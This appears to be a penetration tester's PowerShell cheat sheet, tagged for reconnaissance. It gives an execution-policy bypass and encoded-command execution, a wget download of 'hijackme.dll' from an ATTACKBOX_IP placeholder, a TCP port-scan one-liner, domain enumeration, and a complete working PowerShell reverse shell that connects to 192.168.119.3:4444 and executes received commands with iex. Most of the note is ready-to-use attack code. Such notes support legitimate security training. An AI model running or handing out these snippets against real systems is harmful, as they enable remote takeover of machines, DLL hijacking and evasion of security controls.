**Tags:** #type/tech-specific 

---
**Tags:** #type/tool  #tactic/reconnaissance/active 
**Link:** 
**Purpose:** default shell on modern windows

---
# Info
Can directly execute encoded commands

# Usage
bypass execution policies
	`powershell.exe -nop -exec bypass`: run powershell with 
execute base64 encodede command: `powershell.exe -EncodedCommand <base64string>`
# Snippets
#### download file from attacker machine
`wget -O hijackme.dll ATTACKBOX_IP:PORT/hijackme.dll`
#### perform tcp port scan
`1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.50.151", $_)) "TCP port $_ is open"} 2>$null`
#### test connection on one tcp port
`Test-NetConnection -Port 445 192.168.50.151`
#### print the current domain
`(Get-CimInstance Win32_ComputerSystem).Domain` or `$env:USERDOMAIN`
#### Simple Reverse Shell
```powershell
$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```